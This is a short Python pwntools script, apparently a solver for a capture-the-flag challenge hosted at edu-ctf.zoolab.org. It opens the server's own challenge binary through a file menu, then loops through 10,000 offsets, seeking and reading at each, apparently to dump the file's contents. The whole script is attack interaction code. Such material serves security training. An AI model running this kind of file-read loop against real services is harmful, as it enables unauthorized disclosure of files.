from pwn import *

p=remote("edu-ctf.zoolab.org",10001)
print(p.read())
p.sendline(b'1')
print(p.read())
p.sendline(b'/home/chal/chal')
print(p.read())

for i in range(10000):
  p.sendline(b'5')
  print(p.read())
  k=100 * i
  p.sendline(str(k).encode())
  print(p.read())
  p.sendline(b'2')
  print(p.read())
  p.sendline(b'3')
  print(p.read())